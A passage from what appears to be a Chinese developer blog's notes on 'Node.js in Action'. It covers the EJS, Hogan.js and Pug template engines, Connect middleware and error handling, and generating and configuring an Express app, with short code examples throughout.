： 123456const ejs = require('ejs');const template = '&lt;%- message %&gt;'const context = &#123; message: "&lt;script&gt;alert('Trusted JavaScript!');&lt;/script&gt;" &#125;; console.log(ejs.render(template, context)); 注意！指明 EJS 标签的字符是可修改的，比如像这样： 12345const ejs = require('ejs');ejs.delimiter = '$';const template = '&lt;$= message $&gt;'const context = &#123; message: 'Hello template!' console.log(ejs.render(template,context)); 将 EJS 集成到你的程序中把模板和代码放到同一个文件里很别扭，并且会显得代码很乱。接下来使用 Node API 从单独的文件中读取模板。 进入工作目录，创建 app.js 文件，把下面的代码放在里面。 123456789101112131415161718192021222324252627282930// app.jsconst ejs = require('ejs');const fs = require('fs');const http = require('http');const filename = './template/students.ejs';const students = [ &#123; name: 'Rick LaRue', age: 23 &#125;, &#123; name: 'Sarah Cathands', age: 25 &#125;, &#123; name: 'Bob Dobbs', age: 37 &#125;];// 创建 HTTP 服务器const server = http.createServer((req, res) =&gt; &#123; if (req.url === '/') &#123; // 从文件中读取模板 fs.readFile(filename, (err, data) =&gt; &#123; const template = data.toString(); const context = &#123; students: students &#125;; // 渲染模板 const output = ejs.render(template, context); res.setHeader('Content-Type', 'text/html'); // 发送响应 res.end(output); &#125;); &#125;else&#123; res.statusCode = 404; res.end('Not Found'); &#125;&#125;); server.listen(8000); 接下来创建存放模板文件的 students.ejs 文件。 1234567&lt;% if (students.length) &#123; %&gt; &lt;ul&gt; &lt;% students.forEach(student =&gt;&#123; %&gt; &lt;li&gt;&lt;%= student.name %&gt; (&lt;%= student.age %&gt;)&lt;/li&gt; &lt;% &#125;) %&gt; &lt;/ul&gt;&lt;% &#125; %&gt; 缓存 EJS 模板如果有必要，可以让 EJS 把模板函数缓存在内存中。也就是说在解析完模板文件后，EJS 可以把解析得到的函数存下来。这样以后需要渲染这个模板时不用再次解析，所以渲染速度会快。 如果正在开发过程当中，想即时看到模板文件修改后的效果，则不要启用缓存。但在把程序部署到生产环境中时，启用缓存是一种简单快捷的性能优化办法。可以通过环境变量 NODE_ENV判定是否启用缓存 12345const cache = process.env.NODE_ENV === 'production'const output = ejs.render( template, &#123; students, cache, filename &#125;); 第二个参数的 filename 选项不仅限于文件，可以用要渲染的模板的唯一标识。接下来看看怎么在客户端使用 EJS。 在客户端程序中使用 EJS 要在客户端使用 EJS ，首先要先把 EJS 搜索引擎下载到工作目录下面 1curl -O https://raw.githubusercontent.com/tj/ejs/master/lib/ejs.js 下载完就可以在客户端使用 EJS ，下面代码存为 index.html 并试着在浏览器打开运行 123456789101112131415161718192021222324252627&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;script src="./ejs.js"&gt;&lt;/script&gt; &lt;script src="http://ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.js"&gt; &lt;/script&gt; &lt;title&gt;EJS example&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="output"&gt;&lt;/div&gt;&lt;/body&gt;&lt;script&gt; const template = "&lt;%= message %&gt;"; const context = &#123; message: 'Hello template!' &#125;; $(document).ready(() =&gt; &#123; $('#output').html( ejs.render(template, context) ) &#125;);&lt;/script&gt;&lt;/html&gt; Hogan 模板引擎，特意限制了模板代码中可用的功能。 使用 Mustache 模板语言与 HoganHogan.js 是 Twitter 为满足自己的需求而创建的引擎模板。Hogan 是 Mustache 模板语言标准的具体实现。 跟 EJS 不用的是，Mustache 遵循极简主义，特意去掉了条件逻辑。在内容过滤上，Mustache 只为防止XSS 的攻击而保留了转义处理功能，主张模板代码应该尽可能地简单。 本节将介绍： 如何在程序中创建和实现 Mustache 模板 Mustache 标准中的各种模板标签 如何用子模板组织模板 如何用定制的分隔符和其他选项对 Hogan 进行微调 创建模板要使用 Hogan ，同样先安装 1npm i -save hogan.js 下面是用 Hogan 使用简单模板渲染上下文的例子。运行后输出 ’Hello template‘ 12345const hogan = require('hogan.js');const templateSource = '&#123;&#123;message&#125;&#125;';const context = &#123; message: 'Hello Template' &#125;const template = hogan.compile(templateSource);console.log(template.render(context)); 1node index.js 了解如何用 Hogan 处理 Mustache 模板后，下面看看它支持哪些标签 Mustache 标签Mustache 标签在概念上跟 EJS 的标签类似，也有变量值的占位符，指明哪里需要循环。可以增强 Mustache 的功能，在模板里添加注释。 1.显示简单的值在 Mustache 模板中，要把想要显示的上下文的名称放在大括号中。大括号在 Mustache 社区里被称为胡须。比如说，要显示上下文项 name 的值，应该使用 Hogan 标签 1&#123;&#123;name&#125;&#125; 跟大多数模板一样，Hogan 默认也会对内容进行转义以防止XSS 攻击，如果想要在 Hogan 中显示未转义的值，既可以把上下文的名称放在第三条胡须中，也可以在前面添加一个 &amp; 符号。 例如 1&#123;&#123;&amp;name&#125;&#125; 如果想在模板中加注释，可以这样 1&#123;&#123;! This is a comment&#125;&#125; 2.区块：多个值的循环遍历尽管 Hogan 不允许在模板中使用逻辑，但是它确实引入了一种更加优雅的方法，用 Mustache 区块对上下文项中多个值做循环遍历： 123456const context = &#123; students:[ &#123; name: 'J', age:'23'&#125;, &#123; name: 'L', age:'53'&#125; ]&#125; 如果要创建一个模板，让每个学生都显示在单独的 HTML 段落中，可以像下面这样轻松实现： 12&lt;p&gt;Name: J,Age: 23 years old &lt;/p&gt;&lt;p&gt;Name: L,Age: 53 years old &lt;/p&gt; 下面这个模板能生成上面的 HTML : 123&#123;&#123;# students&#125;&#125; &lt;p&gt;Name: &#123;&#123;name&#125;&#125;, Age: &#123;&#123;age&#125;&#125; years old &lt;/p&gt;&#123;&#123;/students&#125;&#125; 3.反向区块：值不存在时的默认 HTML如果上下文数据中的 students 不是数组会怎么样？比如说，如果只是单个对象，那么模板互显示这个对象，但是如果是 undefined 或 false ,空数组，则什么都不显示。 如果想输出消息指明该区块的值不存在，那么可以用 Mustache 的反向区块。把下面的快模板代码加到前面那个显示学生消息的模板中，上下文中没有数据时就会显示这条消息： 123&#123;&#123;^ students&#125;&#125; &lt;p&gt;No students found&lt;/p&gt;&#123;&#123;/ students&#125;&#125; 4.区块 lambda: 区块内的定制功能如果 Mustache 现有功能无法满足，可以按照它的标准定制区块标签。让它调用函数处理模块内容，不用循环遍历数组。这被称为 区块 lambda 。 下面的例子用到了 github-flavored markdown 模块: 1npm install github-flavored-markdown --dev 在下面这段代码中，模板中的Name传给由区块 lambda 调用的 Markdown 解析器，生成了Name。 123456789101112const hogan = require('hogan.js');// 引入 Markdown 解析器const md = require('github-flavored-markdown');// Mustache 模板也包含 Markdown 格式的内容const templateSource = `&#123;&#123;#markdown&#125;&#125;**Name**:&#123;&#123;name&#125;&#125;&#123;&#123;/markdown&#125;&#125;`;// 模板的上下文包含了一个解析 Markdown 的区块 lambdaconst context = &#123; name: 'Rick LaRue', markdown: () =&gt; text =&gt; md.parse(text)&#125;const template = hogan.compile(templateSource);console.log(template.render(context)); 使用区块 lambda 可以在模板中轻松实现缓存和转换机制等功能。 5.子模板：在其他模板中重用模板为了避免多个模板中复制粘贴相同的代码，可以将这些通用的代码做成子模板（partial）。子模板是放在其他模板内的构件，可以把复杂的模板分解成简单模板。 比如下面这个例子，将显示学生数据的代码从主模板中分离出来做成了子模板。 1234567891011121314151617181920212223242526272829const hogan = require('hogan.js');// 用于子模板的代码const studentTemplate = ` &lt;p&gt; Name: &#123;&#123; name &#125;&#125;, Age: &#123;&#123; age &#125;&#125; years old &lt;/p&gt;`// 主模板const mainTemplate = ` &#123;&#123;# students&#125;&#125; &#123;&#123;&gt;student&#125;&#125; &#123;&#123;/ students&#125;&#125;`const context = &#123; students: [&#123; name: 'Jane Narwhal', age: 21 &#125;, &#123; name: 'Rick LaRue', age: 26 &#125;]&#125;// 编译主模板和子模板const template = hogan.compile(mainTemplate);const partial = hogan.compile(studentTemplate);// 渲染主模板和子模板const html = template.render(context, &#123; student: partial &#125;);console.log(html); 微调 Hogan Hogan 用起来相当简单，掌握它的标签汇总表就够了。在使用时可能只有一两个地方需要调整一下. 如果你不喜欢 Mustache 风格的大括号，可以给 compile 方法传入一个参数覆盖 Hogan 所用的分隔符。下面的例子把 EJS 风格的分隔符编译在 Hogan 中： 1hogan.compile(text, &#123; delimiters: '&lt;% %&gt;' &#125;); 除了 Mustache，还有其他模板语言。比如想把 HTML 的噪声都去掉的 Pug。 用 Pug 做模板Pug,以前叫做 Jade,它用另一种方式来表示 HTML，是 Express 的默认模板引擎。Pug 和其他主流模板系统的差别主要在于它对空格的使用。Pug 模板用缩进表示 HTML 标签的嵌入关系。HTML 标签也不必明确给出关闭标签，从而避免了因为过早关闭，或根本就不关闭标签所产生的问题。由于有严格的缩进规则，因此 Pug 模板看起来很简洁，更易于维护。 12345678910&lt;html&gt; &lt;head&gt; &lt;title&gt;Welcome&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="main" class="content"&gt; &lt;strong&gt;"Hello world!"&lt;/strong&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 这段 HTML 对应的 Pug 模板如下： 123456html head title Welcome body div.content#main strong &quot;Hello world!&quot; Pug 像 EJS 一样，可以嵌入 JavaScript ，可以用在服务端和客户端。但 Pug 还有其他特性，比如模板继承和 mixins。用 mixins 可以定义易于重用的小型模板，用来表示常用的视觉元素的 HTML ，比如条目列表和盒子。Mixins 很像上一节介绍的 Hogan 的自末班。有了模板继承，那些把一个 HTML 页面渲染到多个文件中 Pug 模板组织起来就更容易了。先安装： 1npm install pug -S 本节介绍： Pug 的基础知识，比如说类名、属性和块扩展 如何用内置的关键字往 Pug 模板里添加逻辑 如何用继承、块和mixins 组织模板 Pug 基础知识Pug 的标签和 HTML 一样，但是抛弃了前后的字符，并用缩进表示标签的嵌套关系。标签可以用 .&lt;classname&gt;关联一个或者是多个 CSS 类。比如应用了 content 和 sidebar 类的 div 元素表示为： 1div.content.sidebar 在标签上添加 #&lt;ID&gt;可以赋予它 CSS 的 ID 。比如上面那个再加上一个 ID 1div.content.sidebar#featured_content 1.指定标签的属性将标签的属性放在括号中，每个属性之间用括号分开，下面的Pug 表示一个 会在新的浏览器打开的标签： 1a(href=&apos;http://laibh.top&apos;,target=&apos;_blank&apos;) 因为带属性的标签可能会很长，所以 Pug 在处理这样的标签的时候会比较灵活。比如下面的这种表示跟那个效果是一样的： 12a(href=&apos;http://laibh.top&apos;,target=&apos;_blank&apos;) 也可以指定不需要值的属性，下面的这段 Pug 实例是一个 HTML 表单，其中包含一个 select 元素，也有预定的 option ： 123456strong Select your favorite food:form select option(value=&apos;Cheese&apos;) Cheese option(value=&apos;Tofu&apos;) TofuSpecifying tag content 在前面那段代码中还有标签内容的示例：strong 标签后面的 Select your favorite food:；第一个 option 后面的 Cheese；第二个 option 后面的 Tofu。 这是 Pug 中指定标签内容的常用方法，但不是唯一的。尽管这种风格在指定的比较短的内容时很好用，但如果标签的内容很长，则会导致 Pug 模板中出现超长的代码行。不过。就想下面这个例子，可以用 | 指定标签的内容 1234textarea | This is a some default text | that the user should be | provided with. 如果 HTML 标签只接受文本（即不能嵌入 HTML 元素），比如 style 会让 script 。则可以去掉 | 字符，像下面这样： 12345style. h1&#123; font-size: 6em; color: #9d9; &#125; 用这两种方法别分可以表示长短两种内容，可以让 Pug 模板保持有呀，Pug 还有一种表示嵌套关系的办法，叫做扩展。 2.用块扩展把他组织好Pug 一般用 缩进表示嵌套，但有时缩进形成的空格太多了。比如下面的这个用缩进定义链接列表的 Pug 模板： 1234567ul li a(href=&apos;http://nodejs.org/&apos;) Node.js homepage li a(href=&apos;http://npmjs.org/&apos;) NPM homepage li a(href=&apos;http://nodebits.org/&apos;) Nodebits blog 如果用 Pug 块扩展，这个例子会更加紧凑。块扩展可以在标签后面用冒号表示嵌套。例如下面这段代码： 1234ul li: a a(href=&apos;http://nodejs.org/&apos;) Node.js homepage li: a(href=&apos;http://npmjs.org/&apos;) NPM homepage li: a(href=&apos;http://nodebits.org/&apos;) Nodebits blog 3.将数据纳入到 Pug 模板中数据传入到 Pug 引擎的方式跟 EJS 一样，模板先被编译成函数，然后带着上下文调用它，以便于渲染输出 HTML 。如下例： 12345const pug = require(&apos;pug&apos;);const template = &apos;strong #&#123;message&#125;&apos;const context = &#123; message: &apos;Hello template&apos; &#125;;const fn = pug.compile(template);console.log(fn(context)); 这个模板中的 #{message}是要被上下文值替换掉的占位符。 上下文值也可以作为属性的值。这个例子会渲染出来 1&lt;a href="http://laibh.top"&gt; &lt;/a&gt; 12345const pug = require(&apos;pug&apos;);const template = &apos;a(herf=url)&apos;const context = &#123; url: &apos;http://laibh.top&apos; &#125;;const fn = pug.compile(template);console.log(fn(context)); Pug 模板中的逻辑把数据交给模板后，还需要定义处理数据的逻辑，可以直接在模板中嵌入 JavaScript 代码来定义数据处理逻辑。例如 if 、for 、var 声明等等。下面有个例子 123456789101112131415161718h3.contact-header My Contactsif contacts.length each contact in contacts - var fullName = contact.firstName + &apos; &apos; + contact.lastName .contact-box p fullName if contact.isEditable p: a(href=&apos;/edit/+contact.id) Edit Record p case contact.status when &apos;Active&apos; strong User is active in the system when &apos;Inactive&apos; em User is inactive when &apos;Pending&apos; | User has a pending invitation else p You currently do not have any contacts 下面来看一下 Pug 模板中嵌入 javascript 代码如何处理输出 1.在Pug模板中使用 JavaScript 带有 -前缀的 JavaScript 代码的返回结果不会出现在渲染结果中。带有 =前缀的 JavaScript 代码的执行结果会出现。但为了防止 XSS 攻击做了转义处理。如果 JavaScript 代码生成的内容不应该转义。那么可以使用前缀 ！=. 在 Pug 中，有些常用的 条件判断和循环语句可以不带前缀：if/else/case/when/default/until/each和unless Pug 中还可以定义变量，下面两种赋值方式效果是一样的： 12-count = 0count = 0 没有前缀的语句没有输出。 2.循环遍历对象和数组Pug 中的 JavaScript 可以访问上下文中的值。在下面的例子中，我们会读取一个 Pug 模板，并让它显示一个包含两个消息的上下文的数组： 1234567891011const pug = require('pug');const fs = require('fs');const template = fs.readFileSync('./template.pug');const context = &#123; messages: [ 'You have logged in successfully.', 'Welcome back!' ]&#125;;const fn = pug.compile(template);console.log(fn(context)); Pug 模板的内容 123- messages.forEach( message =&gt;&#123; p= message- &#125;) 运行代码： 1node index.js 输出这样的结果： 1&lt;p&gt;You have logged in successfully.&lt;/p&gt;&lt;p&gt;Welcome back!&lt;/p&gt; Pug 中还有一种非 JavaScript 形式的循环：each 语句。用 each 语句很容易实现数组和对象属性的循环遍历. 12each message in messages p= message 对象属性的循环遍历可以稍有不同，例如这样： 1234each value, key in post div strong #&#123;key&#125; p value 3.条件化渲染的模板代码有时候要根据数据的取值来决定显示那些模板，下面是一个条件判断的例子。几乎有一半的可能会输出 script 标签： 12345-n = Math.round(Math.random() * 1) + 1;-if (n === 1)&#123; script alert(&apos;You win&apos;);- &#125; 条件判断在 Pug 中还有中更简洁的写法： 1234-n = Math.round(Math.random()* 1) + 1 ; if n === 1 script alert(&apos;You win!&apos;); 如果条件判断是取反的，比如 if (n!=1)，可以用 Pug 的 unless 关键字： 1234-n Math.round(Math.random() *1) + 1; unless n === 1 script alert(&apos;You win!&apos;); 4.在 Pug 中使用 case 语句Pug 中还有类似 switch 的 非 JavaScript 条件判断：case 语句。case 语句可以根据模板的场景指定输出。 在下面的例子中，我们用 case 语句以三种不同的方式显示博客的搜索结果。如果没有结果，则显示一条提示消息。如果找到一篇文章，则显示它的详细内容。如果很多篇则用 each 语句循环遍历所有文章，显示它们的标题： 12345678case results.length when 0 p No results found when 1 p= results[0].content default each result in results p= result.title 组织 Pug 模板模板定义好了之后，要知道该如何组织。跟程序逻辑一样，你肯定也不想让模板文件过大，一个模板应该对应一个构件：一个页面，一个边栏或者是一篇博客文章的内容； 下面会介绍几种机制，让几个不同模板文件一起渲染内容： 用模板继承组织多个模板文件 用块前缀/追加实现布局 模板包含 借助 mixins 重用模板逻辑 1.用模板继承组织多个模板文件模板继承是多个模板文件的结构化处理方法之一。从概念上讲，模板就像面向对象编程中的类。一个模板可以有扩展另一个，然后这个再扩展另一个，只要合理，使用多少层都可以。 下面有个例子，用模板继承提供一个简单的 HTML 包装器，可以用来包装 页面内容。创建存放 Pug文件的 templates目录。在其中创建模板文件 layout.pug 12345html head block title body block content layout.pug 中有 HTML 页面的基本定义和两个模板块。模板块可以由后裔模板提供内容的占位符。layout.pug 的后裔模板可以在 title 模板块的位置设置页面标题，在 content 模板块的位置设定页面的内容要显示什么。 接下来创建 page.pug。这个模板会提供 title 和 content 块的具体内容： 12345html head block title body block content 继承的实际用法： 123456789101112131415const pug = require('pug');const fs = require('fs');const templateFile = './templates/page.pug'const iterTemplate = fs.readFileSync(templateFile);const context = &#123; messages: [ 'You have logged in successfully.', 'Welcome back!' ]&#125;const iterFn = pug.compile( iterTemplate, &#123; filename: templateFile &#125;)console.log(iterFn(context)); 2.用块前缀/块追加实现布局在前面那个例子中，layout.pug 中的模板没有内容，因此在 page.pug 模板中设定内容简答直接。如果被继承的模板中没有内容，也可以用块前缀和块追加，在原有内容基础上构建新内容而不是替换它。 下面的 layout.pug 模板中加了一个模板块 scripts ，其中有加载 jq 的 script 标签 12345678html head - const baseUrl = &quot;http://ajax.googleapis.com/ajax/libs/jqueryui/1.8/&quot; block title block style block scripts body block content 1234567891011121314151617181920212223extends layout.pugblock title title Messagesblock style link(rel=&quot;stylesheet&quot;, href=baseUrl+&quot;themes/flick/jquery-ui.css&quot;)block scripts script(src=baseUrl+&quot;jquery-ui.js&quot;)block content - count = 0 each message in messages - count = count + 1 script. $(() =&gt; &#123; $(&quot;#message_#&#123;count&#125;&quot;).dialog(&#123; height: 140, modal: true &#125;); &#125;); != &apos;&lt;div id=&quot;message_&apos; + count + &apos;&quot;&gt;&apos; + message + &apos;&lt;/div&gt;&apos; 但模板继承不是唯一一种集成多个模板的办法，还可以使用 include Pug 命令。 3.模板包含Pug 中的 include 命令式另一个组织模板的工具。这个命令会引入另一个模板中内容。 如果在前面那个 layout.pug 中加入一个 include footer 就会引入这个模板 123456789html head - const baseUrl = &quot;http://ajax.googleapis.com/ajax/libs/jqueryui/1.8/&quot; block title block style block scripts body block content include footer 可以 用 include 往 layout.pug 中添加关于网站的消息或设计元素。也可以指定文件的扩展名，包含 非 Pug 文件（比如 include xxx.html） 4.借助 mixin 重用模板逻辑尽管 Pug 的 include 命令能帮我们引入之前创建的 代码块，但要构建在程序和不同页面之间共享的可重用功能库时，它就帮不上忙了。Pug 为此专门提供了 mixin 命令，可以用来定制可重用的 Pug 代码块。 mixin 模拟的是 JavaScript 函数。它跟函数一样，可以带参数，并且这些参数可以用来生成 Pug 代码。 比如说要处理下面这种数据结构： 12345const students = [ &#123; name: 'Rick LaRue', age: 23 &#125;, &#123; name: 'Sarah Cathands', age: 25 &#125;, &#123; name: 'Bob Dobbs', age: 37 &#125; ] 如果要把对象中提取出来的属性输出到 HTML 列表中，那么可以像下面这样定义一个 mixin: 1234mixin list_object_property(objects, property) ul each object in objects li = object[property] 然后就可以像下面这样借助 mixin显示这些数据了 1mixin list_object_property(students,'name'); 借助模板继承、include 语句和 mixin，你可以轻松地重用展示标记，防止模板文件变得过于冗长 总结 模板引擎可以把程序逻辑和展示组织好 EJS、Hogan.js 和 Pug 都是 Node 中比较流行的模板引擎。 EJS 支持简单的流程控制，以及转义或非转义插值。 Hogan.js 是简单的模板引擎，不支持流程控制，但支持 Mustache 标准 Pug 是比较复杂的模板语言，可以输出 HTML，但不用尖括号。 Pug 用空格表示标签的嵌套关系]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nodejs实战 —— 深入了解Connect 和 Express]]></title>
    <url>%2F2018-12-08-NodeJs2-Part6.html</url>
    <content type="text"><![CDATA[读 《node.js实战2.0》，进行学习记录总结。 当当网购买链接 豆瓣网1.0链接 深入了解Connect 和 Express本章内容 了解 Connect 和 Express 是用来做什么的 中间件的使用和创建 Express 程序的创建和配置 用 Express 中的关键即使处理错误、渲染视图和表单 用 Express 的 架构技术实现路由、REST API 和用户认证 Connect创建 Connect 程序Connect 以前是 Express 的基础，但实际上只用 Connect 也能做出完整的 Web 程序。安装： 1npm i connect 最简单的 Connect 程序： 12345const app = require('connect')();app.use((req,res,next) =&gt;&#123; res.end('Hello, world!');&#125;);app.listen(3000); 运行： 1node server.js 打开 http://localhost:3000 可以看到网页。 了解 Connect 中间件的工作机制Connect 中间件是 JavaScript 函数，这个函数一般会有三个参数：请求对象、响应对象以及一个名为 next 的回调函数。一个中间件完成自己的工作，要执行后续的中间件，可以调用这个回调函数。 中间件运行之前，Connect 会用分派器接管请求对象，然后交给程序中的第一个中间件。下图是 典型的Connect 程序的示意图，由分派器和一组中间件组成，这些中间件包括日志记录、消息体解析器、静态文件服务器和定制中间件。 由此可见，借助中间件 API ，可以把一些小的构件块组合在一起，实现复杂的处理逻辑。 组合中间件Connect 中的 use 方法就是用来组合中间件的。我们来定义两个中间件函数，然后把它们都添加到程序中，其中一个是之前的那个例子里的 hello 函数，另外一个是 logger. 1234567891011121314const connect = require('connect');function logger(req,res,next)&#123; console.log('%s %s',req.method,req.url); next();&#125;function hello(req,res)&#123; res.setHeader('Content-Type','text/plain'); res.end('Hello world');&#125;connect().use(logger).use(hello).listen(3000); 这两个中间件的名称签名不一样：一个有 next ,一个没有，因为后面这个中间件完成了 HTTP 响应，再也不需要把控制权交给分派器了。 use() 函数返回的是 Connect 程序的实例，支持方法链，不过并不一定要把 .use() 链起来，像下面这样也可以： 1234const app = connect();app.use(logger);app.use(hello);app.listen(3000); 中间件的顺序中间件的顺序会对程序的行为产生显著影响，漏掉 next() 能停止执行，也可以通过组合中间件实现用户认证之类的功能。 尝试调换顺序： 1234567891011121314const connect = require('connect');function logger(req,res,next)&#123; console.log('%s %s',req.method,req.url); next();&#125;function hello(req,res)&#123; res.setHeader('Content-Type','text/plain'); res.end('Hello world');&#125;connect().use(hello).use(logger).listen(3000); 上面例子先调用 hello,程序如期返回响应结果，但 logger 永远也不会执行，因为 hello 没有调用 next().所以控制权没有交回给分派器，它也不能调用下一个中间件。也就是说，如果某个中间件不调用 next(),那链在它后面的中间件就不会被调用了。 创建可配置的中间件 为了可配置，中间件一般会遵循一个简单的惯例：用一个函数返回另一个函数（闭包），这种可配置中间件的基本结构如下所示: 12345678function setup(options)&#123; // 设置逻辑 return function(req,res,next)&#123; // 中间件逻辑 &#125;&#125;// 用法app.use(setup(&#123;some:'options'&#125;)); 注意 app.use 中的 setup 函数，之前放的是对中间件函数的引用. 创建一个可以传参(字符串参数)自己配置的 logger 中间件： 12345678910111213// logger.jsfunction setup(format) &#123; const regexp = /:(\w+)/g; return function createLogger(req, res, next) &#123; const str = format.replace(regexp, (match, property) =&gt; &#123; return req[property]; &#125;); console.log(str); next(); &#125;&#125;module.exports = setup; 现在这个 logger 成了可配置的中间件，所以，可以在同一程序中给.use()传入不同配置的 logger，并且为了保持一致性，所有 Connect 核心中间件都是可配置的。 调用： 12345678910111213141516const setup = require('./logger.js');const connect = require('connect');function logger(req, res, next) &#123; console.log('%s %s', req.method, req.url); next();&#125;function hello(req, res) &#123; res.setHeader('Content-Type', 'text/plain'); res.end('Hello world');&#125;connect() .use(setup(':method :url')) .use(hello) .listen(3000); 使用错误处理中间件Connect 中间有一种用来处理错误的中间件变体，跟常规的中间件相比，除了请求、响应对象外，错误处理中间件的参数还多了一个错误对象。 Connect 刻意将处理做到很简单，让开发人员指明如何处理错误。比如，可以只让系统和程序级错误通过中间件，或者只让用户错误通过，或者让两者结合的组合通过。 介绍错误处理中间件的工作机制以及一些使用的模式： 用Connect 的默认错误处理器 因为函数 foo() 没有定义。所以下面的这个中间件会抛出错误 ReferenceError: 1234567const connect = require('connect');connect().use((req,res)=&gt;&#123; foo(); res.setHeader('Content-Type','text/plain'); res.end('hello world');&#125;).listen(3000); Connect 默认的处理时返回状态码 500，响应主体的文本是 Internal Server Error 和错误的详细信息。但在真正的程序中，一般还会对这些错误做些特殊的处理，比如将它们发送给一个日志守护进程。 自行处理程序错误 Connect 也支持用错误处理中间件自行处理错误，比如说，为了在开发时看到简单快捷的错误报告，你可能想用 JSON 格式发送错误信息；而在生产环境中，为了不把敏感的内部信息暴露出来，可以发送一个简单的服务器错误响应。 错误处理中间件函数必须有四个参数：err,req,res和next。 123456789101112131415// errors.jsconst env = process.env.NODE_ENV || 'development';function errorHandler(err, req, res, next) &#123; res.statusCode = 500; switch (env) &#123; case 'development': console.log('Error:'); console.log(err); res.setHeader('Content-Type', 'application/json'); res.end(JSON.stringify(err)); default: res.end('Server Error'); &#125;&#125;module.exports = errorHandler; 用 NODE_ENV 设定程序的模式 Connect 一般会根据环境变量 NODE_ENV(process.env.NODE_ENV) 来切换不同服务器环境的行为。 当 Connect 遇到错误时，它会切换，只去调用错误处理中间件，如下图： 假设有一个允许用户登录到管理区域的博客程序。如果负责用户路由的中间件引发了一个错误，则中间件 blog 和 admin 都会被跳过，因为它们不是错误处理中间件（只有三个参数）。然后 Connect 看到接受错误参数的 errorHandler，就会调用它。中间件看起来像下面这样： 12345connect() .use(router(require('./routes/user'))) .use(router(require('./routes/blog'))) // 跳过 .use(router(require('./routes/admin'))) // 跳过 .use(errorHandler); 基于中间件的执行顺序短路某些功能是组织 Express 程序的基本概念。 Express生成程序的框架Express 对程序结构不作要求，路由可以放在多个文件中，公共资源文件也可以放到任何目录下。最简单的 Express 程序可能像下面这样，但它仍然是一个功能完备的 HTTP 服务器。 123456const express = require('express');const app = express();app.get('/',(req,res) =&gt;&#123; res.end('Hello');&#125;);app.listen(3000); 安装 Express 的可执行程序 首先要用 npm 全局安装 express-generator： 1npm install -g express-generator 装好之后，可以用 –help 选项看看可用的选项 生成程序 用-e（或–ejs）指定要使用的模板引擎是 EJS，执行 express -e shoutbox，一个功能完备的程序会出现在 shoutbox 目录中。其中会有描述项目和依赖项的 package.json文件、程序主文件、public 目录，以及一个放路由处理器的目录。 探索程序 在编辑器中打开 package.json 文件，看看程序的依赖项。安装依赖： 1npm i 生成的 Express 程序框架: 1234567891011121314151617181920212223242526272829303132333435363738394041424344var createError = require('http-errors');var express = require('express');var path = require('path');var cookieParser = require('cookie-parser');var logger = require('morgan');var indexRouter = require('./routes/index');var usersRouter = require('./routes/users');var app = express();// view engine setupapp.set('views', path.join(__dirname, 'views'));app.set('view engine', 'ejs');// 输出有颜色区分的日志，以便于开发调试app.use(logger('dev'));// 解析请求主体app.use(express.json());app.use(express.urlencoded(&#123; extended: false &#125;));app.use(cookieParser());// 提供./public 下的静态文件app.use(express.static(path.join(__dirname, 'public')));// 指定程序路由app.use('/', indexRouter);app.use('/users', usersRouter);// catch 404 and forward to error handlerapp.use(function(req, res, next) &#123; next(createError(404));&#125;);// error handlerapp.use(function(err, req, res, next) &#123; // set locals, only providing error in development res.locals.message = err.message; res.locals.error = req.app.get('env') === 'development' ? err : &#123;&#125;; // render the error page res.status(err.status || 500); res.render('error');&#125;);module.exports = app; 在线留言板程序的规划 下面是这个在线留言板程序的需求。(1) 用户应该可以注册、登录、退出。(2) 用户应该可以发消息（条目）。(3) 站点的访问者可以分页浏览条目。(4) 应该有个支持认证的简单的 REST API。 针对这些需求，我们要存储数据和处理用户认证，还需要对用户的输入进行校验。必要的路由应该有以下两种。 API 路由 GET /api/entries: 获取条目列表 GET /api/page: 获取单页条目 POST /api/entry:创建新的留言条目 Web UI 路由 GET /post：显示创建新条目的表单 POST /post：提交新条目 GET /register：显示注册表单 POST /register：创建新的用户账号 GET /login：显示登录表单 POST /login：登录 GET /logout：退出 Express 和程序的配置Express 还支持自定义的配置项键/值对。 设置环境变量 在 Windows 中用这个： 12set NODE_ENV=production node app 这些环境变量会出现在程序里的 process.env 对象中。 Express 有一个极简的环境驱动配置系统，这个系统由几个方法组成，全部由环境变量NODE_ENV 驱动： app.set() app.get() app.enable() app.disable() app.enabled() app.disabled() 基于环境的配置，环境变量 NODE_ENV 源于 Express，用它告知Node 程序在哪个环境中，其默认的是开发环境。 app.configure() 方法有一个可选的字符串参数，用来指定运行环境。还有一个参数是函数，如果有这个字符串，则在运行环境与字符串相同时才会调用那个函数。如果没有，则在所有环境中都会调用那个函数，这些环境的名称是随意的。为了实现可定制的行为，Express 在其内部使用了配置系统，我们也可以在自己的程序中使用这个系统。 Express 还为布尔类型的配置项提供了 app.set() 和 app.get() 的变体。比如说，app.enable (setting)等同于 app.set(setting, true)，而 app.enabled(setting)可以用来检查该值是否被启用了。app.disable(setting)和 app.disabled(setting)是对它们的补充。 Express 为开发 API 提供了一个配置项，即 json spaces。如果把它加到 app.js 中，程序输出 JSON 的格式会变得更易读： 1app.set('json spaces',2); 渲染视图不管是渲染整个 HTML 页面、一个 HTML 片段，还是一个 RSS 预订源，对几乎所有程序来说，视图渲染都非常重要。其概念很简单：把数据传给视图，然后视图对数据进行转换，对 Web程序来说，通常是转换成 HTML。 Express 中有两种渲染视图的办法：程序层面用 app.render()，在请求或响应层面用res.render() ， Express 内部用的是前一种。本章只用 res.render() 。如果你看一下./routes/index.js，会看到一个调用 res.render(‘index’)的函数，渲染是./views/index.ejs模板： 123router.get('/', function(req, res, next) &#123; res.render('index', &#123; title: 'Express' &#125;);&#125;); 配置视图系统 查找目录： 1app.set('views', path.join(__dirname, 'views')); 这个配置项指明了 Express 查找视图的目录，__dirname 是个全局变量，代表当前运行的文件所在的目录。在开发时，这个目录通常就是当前工作目录（CWD），但在生产环境中，这个文件可能运行在其他目录中。__dirname 有助于保持路径在各种环境中的一致性. 使用默认的模板引擎： 之前在命令行中用 -e 指定模板引擎 EJS ，所以 view engine 被设定为 ejs .Express 